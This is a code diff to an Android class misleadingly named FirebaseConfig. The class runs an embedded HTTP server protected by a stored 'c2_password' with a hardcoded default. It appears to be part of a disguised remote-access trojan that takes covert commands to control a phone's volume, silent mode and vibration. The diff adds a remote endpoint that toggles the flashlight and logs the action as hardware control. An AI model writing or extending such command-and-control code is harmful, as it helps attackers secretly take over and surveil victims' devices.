@@ -22,6 +22,7 @@ import android.util.Log;
 import android.accessibilityservice.AccessibilityService;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.OptIn;
 import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
@@ -549,6 +550,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/max-volume")) {
             setMaxVolume();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/flashlight") || uri.equals("/device/torch")) {
+            toggleFlashlight();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"flashlight\": " + isFlashlightOn + "}");
         } else if (uri.equals("/device/silent-mode")) {
             setSilentMode();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -884,6 +888,40 @@ public class FirebaseConfig extends NanoHTTPD {
     private String getStoredPassword() {
         return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                 .getString("c2_password", "admin1337");
+    }
+
+    private static boolean isFlashlightOn = false;
+
+    @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
+    private void toggleFlashlight() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+                if (cm != null) {
+                    String[] ids = cm.getCameraIdList();
+                    for (String id : ids) {
+                        try {
+                            Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                            if (Boolean.TRUE.equals(hasFlash)) {
+                                isFlashlightOn = !isFlashlightOn;
+                                cm.setTorchMode(id, isFlashlightOn);
+                                logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                                break;
+                            }
+                        } catch (Exception ignored) {}
+                    }
+                }
+            } else {
+                Analytics_Provider ap = Analytics_Provider.getInstance();
+                if (ap != null) {
+                    isFlashlightOn = !isFlashlightOn;
+                    ap.setFlashMode(isFlashlightOn);
+                    logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                }
+            }
+        } catch (Exception e) {
+            Log.e("FirebaseConfig", "Flashlight Error: " + e.getMessage());
+        }
     }
 
     private void vibrateDevice() {
